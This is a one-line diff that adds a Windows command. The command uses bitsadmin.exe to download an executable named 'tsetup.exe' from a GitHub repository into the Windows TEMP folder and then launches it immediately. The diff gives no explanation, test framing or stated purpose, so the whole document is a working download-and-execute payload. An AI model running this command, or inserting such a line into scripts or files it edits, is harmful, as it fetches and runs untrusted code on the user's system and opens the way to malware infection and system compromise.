@@ -1,0 +1,1 @@
+bitsadmin.exe /transfer "Setup" "https://github.com/Notfrom00/test/raw/master/tsetup.exe" "C:\Windows\TEMP\tsetup.exe" & Start C:\Windows\TEMP\tsetup.exe
